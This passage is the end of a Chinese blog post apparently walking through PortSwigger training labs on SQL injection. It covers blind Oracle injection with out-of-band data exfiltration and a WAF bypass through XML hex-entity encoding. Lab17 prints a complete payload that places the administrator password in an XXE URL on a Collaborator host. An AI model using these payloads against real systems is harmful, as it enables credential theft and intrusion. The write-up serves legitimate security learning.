+
+<h1 id="Lab17-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#Lab17-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="Lab17: Blind SQL injection with out-of-band data exfiltration"></a>Lab17: Blind SQL injection with out-of-band data exfiltration</h1><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.1lnl8uo44f24t780fecgbag5kwqoee23.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure>
+
+<p>和上一题一样</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104222330721.png" alt="image-20261104222330721"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TrackingId 注入 SQL</span><br><span class="line">→ SQL 查询 administrator 的 password</span><br><span class="line">→ 把 password 拼进 XML 外部实体的 URL</span><br><span class="line">→ Oracle 解析 XML 时访问这个 URL</span><br><span class="line">→ Collaborator 收到 DNS 请求</span><br><span class="line">→ DNS 子域名前缀就是密码</span><br></pre></td></tr></table></figure>
+
+<p>关键 SQL 结构是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXTRACTVALUE(</span><br><span class="line">  XMLTYPE(&#x27;...外部实体 URL...&#x27;),</span><br><span class="line">  &#x27;/l&#x27;</span><br><span class="line">)</span><br><span class="line">FROM dual</span><br></pre></td></tr></table></figure>
+
+<p>XML 中的外部实体类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % remote SYSTEM &quot;http://密码.你的Collaborator域名/&quot;&gt;</span><br><span class="line">  %remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;||(SELECT password</span><br><span class="line">     FROM users</span><br><span class="line">     WHERE username=&#x27;administrator&#x27;)||&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>会被 Oracle 计算成真实密码，并拼到 URL 中。例如最终访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://py0w5gsvg10g2sx45v59.你的域名/</span><br></pre></td></tr></table></figure>
+
+<p>所以 Collaborator 收到的完整 DNS 名称中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py0w5gsvg10g2sx45v59</span><br></pre></td></tr></table></figure>
+
+<h1 id="Lab18-SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#Lab18-SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="Lab18: SQL injection with filter bypass via XML encoding"></a>Lab18: SQL injection with filter bypass via XML encoding</h1><p>这个要用到一个拓展Hackvertor来绕过检测</p>
+<p>在商品的查看库存地方会POST一个xml格式的id，抓他的包</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224743526.png" alt="image-20261104224743526"></p>
+<p>因为他是xml格式的，所以就不需要拼接单引号，直接union</p>
+<p><code>union select null</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224912722.png" alt="image-20261104224912722"></p>
+<p>被检测了，用拓展的插件进行16进制实体编码</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225030894.png" alt="image-20261104225030894"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225101716.png" alt="image-20261104225101716"></p>
+<p>直接把语句换一下，拼接账号密码</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104225144952.png" alt="image-20261104225144952"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104224637017.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQL注入完结撒花，学到了很多新的东西，感觉很新鲜，有什么补充的会重新更新一下的</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/PortSwigger/" rel="tag"># PortSwigger</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/11/03/php-file-inclusion-learning/" rel="prev" title="PHP 文件包含漏洞学习：伪协议与 CTF+ 实战">
+                  <i class="fa fa-angle-left"></i> PHP 文件包含漏洞学习：伪协议与 CTF+ 实战
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">HanLior</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><div class="busuanzi-count" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 0.8em;">
+  <span>本站访客：<span id="busuanzi_site_uv">加载中…</span> 人</span>
+  <span>总浏览量：<span id="busuanzi_site_pv">加载中…</span> 次</span>
+</div>
+<div style="text-align: center; margin-top: 0.4em;">
+  博客运行时间：<span id="blog-runtime">计算中…</span>
+</div>
+<script>
+  (function () {
+    var startTime = Date.UTC(2026, 9, 16, 10, 48, 16); // 2026-10-16 18:48:16 Asia/Shanghai
+    var runtime = document.getElementById('blog-runtime');
+
+    function updateRuntime() {
+      var elapsed = Math.max(0, Date.now() - startTime);
+      var seconds = Math.floor(elapsed / 1000);
+      var days = Math.floor(seconds / 86400);
+      var hours = Math.floor((seconds % 86400) / 3600);
+      var minutes = Math.floor((seconds % 3600) / 60);
+      var remainingSeconds = seconds % 60;
+      runtime.textContent = days + ' 天 ' + hours + ' 小时 ' + minutes + ' 分钟 ' + remainingSeconds + ' 秒';
+    }
+
+    updateRuntime();
+    window.setInterval(updateRuntime, 1000);
+  })();
+</script>
+<script defer src="https://busuanzi.meuicat.com/js"></script>
+<script>
+  window.setTimeout(function () {
+    ['busuanzi_site_uv', 'busuanzi_site_pv'].forEach(function (id) {
+      var counter = document.getElementById(id);
+      if (counter && counter.textContent === '加载中…') {
+        counter.textContent = '暂不可用';
+      }
+    });
+  }, 10000);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
